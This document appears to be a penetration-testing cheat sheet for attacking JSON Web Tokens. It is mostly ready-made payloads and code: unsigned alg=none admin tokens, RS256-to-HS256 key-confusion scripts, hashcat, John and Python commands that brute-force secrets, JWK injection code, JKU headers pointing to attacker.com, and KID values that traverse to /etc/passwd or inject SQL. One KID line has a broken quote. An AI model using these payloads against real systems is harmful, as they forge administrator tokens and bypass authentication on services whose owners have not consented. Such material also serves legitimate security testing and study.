# JWT Attacks

## JSON Format Reference
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John Doe","iat":1516239022}
Format:  base64url(header).base64url(payload).signature
```
## Algorithm Confusion (alg=none)
```
# Delete signature, set alg to none
{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.

# Common variants: None, NONE, nOnE, none, NoNe
# Also try: {"alg":"None","typ":"JWT"}
```
```python
import jwt
token = jwt.encode({"sub":"admin"}, "", algorithm="none")
```
## RS256 → HS256 Key Confusion
```python
import jwt
with open('public.pem') as f:
    pub = f.read()
token = jwt.encode({"sub":"admin"}, pub, algorithm="HS256")
print(token)
```
## Weak HMAC Secret (Brute-Force)
```
# Hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# John
john --format=jwt jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Manual crack
python3 -c "
import jwt
with open('jwt.txt') as f: t=f.read().strip()
with open('/usr/share/wordlists/rockyou.txt',errors='ignore') as wl:
  for w in wl:
    try: jwt.decode(t,w.strip(),algorithms=['HS256']); print(f'KEY: {w}'); break
    except: pass
"
```
## JWK Injection
```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt, json, base64

priv = rsa.generate_private_key(65537, 2048)
pub = priv.public_key()
n = base64.urlsafe_b64encode(pub.public_numbers().n.to_bytes(256, 'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(pub.public_numbers().e.to_bytes(3, 'big')).rstrip(b'=').decode()

jwk_header = {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":n,"e":e}}
token = jwt.encode({"sub":"admin"}, priv, algorithm="RS256", headers=jwk_header)
```
## JKU Injection
```
# Host your JWK at attacker.com/jwks.json, then:
"jku": "http://attacker.com/jwks.json"
# Use jwt_tool:
python3 jwt_tool.py <token> -X jku -ju http://attacker.com/jwks.json
```
## KID Injection
```
# Path traversal in KID (used as filename to load key):
"kid": "../../dev/null"          → empty key → HMAC with empty secret
"kid": ../../etc/passwd"         → file content as key

# SQLi in KID (Node.js/MySQL):
"kid": "key' UNION SELECT 'hmac_key' -- "
```
## Other Header Attacks
```
# JKU whitelist bypass — open redirect in whitelisted domain:
"jku": "https://trusted.com/redirect?url=http://attacker.com/jwks.json"

# Embedded JWK — if server trusts jwk from header (rare but happens)
```
## Common JWT Libraries & Default Algorithms
```
jsonwebtoken (Node.js):  default HS256, accepts none by default
pyjwt (Python):          needs explicit algorithm, none raises
jjwt (Java):             needs explicit algorithm
jose-jwt (C#):           needs explicit algorithm
nimbus-jose (Java):      needs explicit algorithm
```
## References
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
